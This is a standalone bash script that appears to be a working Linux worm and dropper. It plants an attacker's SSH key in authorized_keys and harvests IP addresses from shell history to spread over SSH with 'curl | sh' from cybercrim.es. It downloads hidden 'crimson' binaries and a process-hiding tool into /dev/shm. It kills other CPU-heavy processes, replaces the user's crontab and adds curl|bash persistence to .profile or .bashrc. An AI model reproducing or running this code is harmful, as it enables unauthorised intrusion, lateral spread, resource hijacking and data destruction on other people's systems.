#!/bin/bash

if [ "$(pgrep -f '\?')" > /dev/null ]; then
    exit 0
fi    

if [ "$HOME" != "/home/$USER" ]; then
    export HOME="/home/$USER"
fi

if ! grep -q 'evorip' "$HOME/.ssh/authorized_keys"; then
    echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCmqGRKD0Fu2btT8cDs2SxBT9CGXRwTBz5bypP/i/TESF3k8Vxew+n2Z4vvjbQrQT2GAGoy40lBmm0WUXY7AhQYkeAZ/kbqtFh9dIm8r++H2YOGe/3grgw6LPWIqnBf7oGgd5XbeESO+F2sSw5CePi5oC9IOxOUJIBRI8MWNLihvFbOb6j0X1XzpOID6KyBxYAg0KyHUbOCS+EhXDPIEKH7YkSfUTHIXX9SZ2s40Vjxq0yb96CjaOul8YbHsTgu1R7pKMJZfPbVWN5FnTyTMXkbv34cmUWY9mmxvKAOwJk9LAKMFl5bRfqf5x/HzeXQUJdEBiUi32yzQpz//M52lDwcyCA7VBs1lH/3xt3OCatzPk+fIRaskmq1GN9HbWQSC3O9NfGsGtiesUlilBhie9MA7GfmxvaQ1YxL3O2b44WP3pZ3LYdr3WRuJJX0lmbcimlRLLkCkUem/22r4IVBn9G5tFazx7+LiSCQXQLD1sROcWgRgKxT9753+CFl7g9Bew4IRD7LeeTOxsrdqUHE89srVFBCRhFWu1YuX8VBhg0jaNXMrvhx7iHKgl2M1osTR/Fs3QNvZ0tgGekcFZAsFhw4fSgAgews/xlRsZQeL4fidynXcgnvY2mc7prvxFd7OEGOMU0Rj79wuatHsCuuNIzN0DAnQEwJCJilvCRK5M58Zw== evorip@ripsec' >> "$HOME/.ssh/authorized_keys"
fi

if [ -f "$HOME/.bash_history" ]; then
    history_file="$HOME/.bash_history" && historyc=true
elif [ -f "$HOME/.history" ]; then
    history_file="$HOME/.history" && historyc=true
elif [ ! -f "$HOME/.history" ] && [ ! -f "$HOME/.bash_history" ]; then
    historyc=false
fi

if [ "${historyc}" = true ]; then
    (
    grep -oP '\b(?:\d{1,3}\.){3}\d{1,3}\b' $HOME/.bash_history | sort -u | while read ip; do
      if ! timeout 7s ssh -o StrictHostKeyChecking=no ubuntu@$ip ls -lah &>/dev/null; then
        continue
      fi
    
      timeout 7s ssh -o StrictHostKeyChecking=no ubuntu@${ip} "curl -s https://cybercrim.es/l | sh"
      timeout 7s ssh -o StrictHostKeyChecking=no jenkins@${ip} "curl -s https://cybercrim.es/l | sh"
      timeout 7s ssh -o StrictHostKeyChecking=no root@${ip} "curl -s https://cybercrim.es/l | sh"
      timeout 7s ssh -o StrictHostKeyChecking=no $USER@${ip} "curl -s https://cybercrim.es/l | sh"
    done

    grep -r -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$HOME/jobs" | cut -d ':' -f 2 | sort -u | while read ip; do
      if ! timeout 7s ssh -o StrictHostKeyChecking=no ubuntu@${ip} ls -lah &>/dev/null; then
        continue
      fi

      timeout 7s ssh -o StrictHostKeyChecking=no ubuntu@${ip} "curl -s https://cybercrim.es/l | sh"
      timeout 7s ssh -o StrictHostKeyChecking=no jenkins@${ip} "curl -s https://cybercrim.es/l | sh"
      timeout 7s ssh -o StrictHostKeyChecking=no root@${ip} "curl -s https://cybercrim.es/l | sh"
      timeout 7s ssh -o StrictHostKeyChecking=no $USER@${ip} "curl -s https://cybercrim.es/l | sh"
    done  
    )
fi

if [ ! "$(command -v curl)" > /dev/null ]; then
    if [ ! "$(command -v wget)" > /dev/null ]; then
        echo 'nothing available'
        exit 1
    else
        export CMDI='wget'
    fi
else
    export CMDI='curl'
fi   

if [ -w '/dev/shm' ]; then
    export dir='/dev/shm'
elif [ -w '/var/tmp' ]; then
    export dir='/var/tmp'
elif [ -w '/tmp' ]; then
    export dir='/tmp'
fi        

if [ "$(uname -m)" = 'x86_64' ]; then
    if [ "${CMDI}" = 'curl' ]; then
        curl -s -o ${dir}/crimson https://cybercrim.es/crimson.x86
        chmod a+x ${dir}/crimson
    elif [ "${CMDI}" = 'wget' ]; then
        wget -q -O ${dir}/crimson https://cybercrim.es/crimson.x86
        chmod a+x ${dir}/crimson
    fi
elif [ "$(uname -m)" = 'aarch64' ] || [ "$(uname -m)" = 'armv8l' ]; then
    if [ "${CMDI}" = 'curl' ]; then
        curl -s -o ${dir}/crimson https://cybercrim.es/crimson.arm 
        chmod a+x ${dir}/crimson
    elif [ "${CMDI}" = 'wget' ]; then
        wget -q -O ${dir}/crimson https://cybercrim.es/crimson.arm
        chmod a+x ${dir}/crimson
    fi
fi

x86_xhide='https://x0.at/rOhT' 
arm_xhide='https://x0.at/KTbz'

if [ "$(uname -m)" = 'x86_64' ]; then
    if [ "${CMDI}" = 'curl' ]; then
        curl -s -o ${dir}/.p ${x86_xhide}
    elif [ "${CMDI}" = 'wget' ]; then
        wget -q -O ${dir}/.p ${x86_xhide}
    fi
elif [ "$(uname -m)" = 'aarch64' ] || [ "$(uname -m)" = 'armv8l' ]; then
    if [ "${CMDI}" = 'curl' ]; then
        curl -s -o ${dir}/.p ${arm_xhide}
    elif [ "${CMDI}" = 'wget' ]; then
        wget -q -O ${dir}/.p ${arm_xhide}
    fi
fi

chmod a+x ${dir}/.p

mon(){
    (
        while true; do
            if [ ! -f ${dir}/crimson ]; then
                if [ "$(uname -m)" = 'x86_64' ]; then
                    if [ "${CMDI}" = 'curl' ]; then
                        curl -s -o ${dir}/crimson https://cybercrim.es/crimson.x86
                        chmod a+x ${dir}/crimson
                    elif [ "${CMDI}" = 'wget' ]; then
                        wget -q -o ${dir}/crimson https://cybercrim.es/crimson.x86
                        chmod a+x ${dir}/crimson
                    fi
                elif [ "$(uname -m)" = 'aarch64' ] || [ "$(uname -m)" = 'armv8l' ]; then
                    if [ "${CMDI}" = 'curl' ]; then
                        curl -s -o ${dir}/crimson https://cybercrim.es/crimson.arm
                        chmod a+x ${dir}/crimson
                    elif [ "${CMDI}" = 'wget' ]; then
                        wget -q -O ${dir}/crimson https://cybercrim.es/crimson.arm
                        chmod a+x ${dir}/crimson
                    fi
                fi
            fi
        done  
    ) &> /dev/null &

    (
        while true; do
            ps aux --sort=-%cpu | awk '$3 > 25 && $11 !~ /\?/ {print $2}' | xargs kill -9
            top -b -n 1 | grep -v '\?' | awk '$9 > 25 {print $1}' | xargs kill -9
            sleep 1
        done
    ) &> /dev/null &
    
    (
        while true; do
            if [ ! "$(pgrep -f '\?')" > /dev/null ]; then
                cd ${dir} && ./.p -s "" -d -p test.pid ${dir}/crimson
            fi
            sleep 2
        done
    ) &> /dev/null &
}

(
    crontab -r
    echo "* * * * * if ! pgrep -f '\?' > /dev/null; then cd ${dir} && ./.p -s "" -d -p test.pid ${dir}/crimson; fi" | crontab -
)

if [ -f "${HOME}/.profile" ]; then
    if ! grep -q 'cybercrim.es' "$HOME/.profile"; then
        echo "if ! pgrep -f '\\?' > /dev/null; then" >> "$HOME/.profile"
        echo "    curl -s https://cybercrim.es/l | bash" >> "$HOME/.profile"
        echo "fi" >> "$HOME/.profile"
    fi
elif [ -f "${HOME}/.bashrc" ]; then
    if ! grep -q 'cybercrim.es' "$HOME/.bashrc"; then
        echo "if ! pgrep -f '\\?' > /dev/null; then" >> "$HOME/.bashrc"
        echo "    curl -s https://cybercrim.es/l | bash" >> "$HOME/.bashrc"
        echo "fi" >> "$HOME/.bashrc"
    fi
fi

mon
